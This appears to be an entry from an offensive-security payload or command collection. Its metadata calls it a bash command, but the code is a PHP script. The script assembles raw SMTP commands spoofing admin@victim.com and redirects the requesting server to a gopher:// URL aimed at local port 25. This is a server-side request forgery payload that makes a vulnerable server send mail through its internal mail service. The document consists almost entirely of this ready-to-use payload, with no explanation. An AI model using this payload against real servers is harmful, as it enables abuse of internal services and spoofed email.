---
id: 773ca361-6cd6-4f9d-9a79-9d3e35c01b56
name: Create email payload and redirect victim to gopher protocol
type: command
executor: bash
data: "<?php\n        $commands = array(\n                'HELO victim.com',\n   \
  \             'MAIL FROM: <admin@victim.com>',\n                'RCPT To: <sxcurity@oou.us>',\n\
  \                'DATA',\n                'Subject: @sxcurity!',\n             \
  \   'Corben was here, woot woot!',\n                '.'\n        );\n\n        $payload\
  \ = implode('%0A', $commands);\n\n        header('Location: gopher://0:25/_'.$payload);\n\
  ?>"
output: null
created_at: '2023-04-06T03:56:37.969014+00:00'
updated_at: '2023-04-10T20:24:10.580667+00:00'
---

# Create email payload and redirect victim to gopher protocol

```bash
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```


